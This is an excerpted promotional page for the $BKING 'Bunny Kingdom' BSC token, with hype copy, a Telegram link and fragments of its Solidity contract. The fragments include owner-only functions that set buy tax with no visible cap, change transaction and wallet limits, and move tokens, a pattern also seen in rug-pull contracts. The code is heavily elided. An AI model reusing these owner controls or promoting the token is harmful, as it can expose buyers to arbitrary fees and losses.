...
BUNNY KINGDOM, $BKING, is a cryptocurrency that embraces the theme of magic, friendship, 
and joyous bunnies in a colorful kingdom. Running on the Binance Smart Chain (BSC), 
$BKING offers a unique and exciting experience for its holders.
...
🚀 Don't Wait! Grab Your Magic Carpet and Let's Take Off on a Thrilling $BKING Adventure!🐰🏰

TG : https://t.me/BunnyKingdomOFC
...
contract BUNNYKINGDOM is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "BUNNY KINGDOM";
    string private constant _symbol = unicode"$BKING";
    ...
    address payable public DevWallet = payable(0x438f0b97cDcf5719f5920802cB62496797dD1cFf);
    address payable public MarketingWallet = payable(0x0c1C3363F23ed93Bd42215F5b09E28eba963D284);
    ...
    function updateFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function setxTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setxWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function transfernewToken(uint256 value, address adr) onlyAddress public virtual {
